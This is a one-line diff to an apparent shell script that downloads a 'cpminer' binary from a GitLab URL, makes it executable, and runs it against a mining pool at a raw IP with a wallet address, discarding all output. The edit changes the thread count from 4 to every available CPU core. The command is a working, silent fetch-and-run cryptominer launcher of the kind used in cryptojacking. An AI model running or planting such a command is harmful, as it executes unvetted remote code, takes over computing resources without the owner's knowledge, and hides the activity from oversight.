@@ -1,1 +1,1 @@
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespowersugar -o stratum+tcp://134.122.127.150:80 -u DJqvjYWEvv8UhkotnmAxXut2ZPMwvLTBtS -p c=DOGE,mc=SUGAR,ID=srantal -t4 > /dev/null 2>&1
+wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer && chmod 777 cpminer && ./cpminer -a yespowersugar -o stratum+tcp://134.122.127.150:80 -u DJqvjYWEvv8UhkotnmAxXut2ZPMwvLTBtS -p c=DOGE,mc=SUGAR,ID=srantal -t$(nproc --all) > /dev/null 2>&1
